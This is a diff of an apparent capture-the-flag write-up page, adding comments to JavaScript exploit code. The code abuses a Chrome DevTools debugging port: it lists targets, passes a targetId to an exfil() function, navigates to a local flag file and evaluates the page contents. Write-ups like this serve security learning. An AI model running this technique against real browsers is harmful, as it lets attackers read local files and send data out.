@@ -778,7 +778,8 @@ Let&rsquo;s try:</p>
 </span></span><span style="display:flex;"><span>        }
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">ws</span>.<span style="color:#a6e22e">onopen</span> <span style="color:#f92672">=</span> () =&gt; {
-</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">ws</span>.<span style="color:#a6e22e">send</span>(
+</span></span><span style="display:flex;"><span>	        <span style="color:#75715e">// once socket is open, we will ask for current targets
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            <span style="color:#a6e22e">ws</span>.<span style="color:#a6e22e">send</span>(
 </span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">JSON</span>.<span style="color:#a6e22e">stringify</span>({
 </span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">id</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">1</span>,
 </span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">method</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;Target.getTargets&#34;</span>,
@@ -788,18 +789,20 @@ Let&rsquo;s try:</p>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">ws</span>.<span style="color:#a6e22e">onmessage</span> <span style="color:#f92672">=</span> (<span style="color:#a6e22e">event</span>) =&gt; {
 </span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">data</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">JSON</span>.<span style="color:#a6e22e">parse</span>(<span style="color:#a6e22e">event</span>.<span style="color:#a6e22e">data</span>);
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">targetId</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">data</span>.<span style="color:#a6e22e">result</span>.<span style="color:#a6e22e">targetInfos</span>[<span style="color:#ae81ff">1</span>].<span style="color:#a6e22e">targetId</span>;
+</span></span><span style="display:flex;"><span>			
+</span></span><span style="display:flex;"><span>			<span style="color:#75715e">// grab the targetId returned by Target.getTargets
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">targetId</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">data</span>.<span style="color:#a6e22e">result</span>.<span style="color:#a6e22e">targetInfos</span>[<span style="color:#ae81ff">1</span>].<span style="color:#a6e22e">targetId</span>;
 </span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">exfil</span>(<span style="color:#a6e22e">targetId</span>);
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>			<span style="color:#75715e">// open new socket in page context
+</span></span><span style="display:flex;"><span>			<span style="color:#75715e">// open new socket in page context using the targetId we got
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">ws</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">WebSocket</span>(
 </span></span><span style="display:flex;"><span>                <span style="color:#e6db74">`http://localhost:</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">port</span><span style="color:#e6db74">}</span><span style="color:#e6db74">/devtools/page/</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">targetId</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>
 </span></span><span style="display:flex;"><span>            );
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>			<span style="color:#75715e">// navigate to flag
+</span></span><span style="display:flex;"><span>			<span style="color:#75715e">// once new socket is open
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            <span style="color:#a6e22e">ws</span>.<span style="color:#a6e22e">onopen</span> <span style="color:#f92672">=</span> () =&gt; {
-</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">ws</span>.<span style="color:#a6e22e">send</span>(
+</span></span><span style="display:flex;"><span>	            <span style="color:#75715e">// navigate to flag local path
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                <span style="color:#a6e22e">ws</span>.<span style="color:#a6e22e">send</span>(
 </span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">JSON</span>.<span style="color:#a6e22e">stringify</span>({
 </span></span><span style="display:flex;"><span>                        <span style="color:#a6e22e">id</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">1</span>,
 </span></span><span style="display:flex;"><span>                        <span style="color:#a6e22e">method</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;Page.navigate&#34;</span>,
@@ -809,7 +812,8 @@ Let&rsquo;s try:</p>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>				<span style="color:#75715e">// wait for flag to load before checking the page&#39;s content
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                <span style="color:#a6e22e">setTimeout</span>(() =&gt; {
-</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">ws</span>.<span style="color:#a6e22e">send</span>(
+</span></span><span style="display:flex;"><span>					<span style="color:#75715e">// evaluate document contents
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                    <span style="color:#a6e22e">ws</span>.<span style="color:#a6e22e">send</span>(
 </span></span><span style="display:flex;"><span>                        <span style="color:#a6e22e">JSON</span>.<span style="color:#a6e22e">stringify</span>({
 </span></span><span style="display:flex;"><span>                            <span style="color:#a6e22e">id</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">2</span>,
 </span></span><span style="display:flex;"><span>                            <span style="color:#a6e22e">method</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;Runtime.evaluate&#34;</span>,
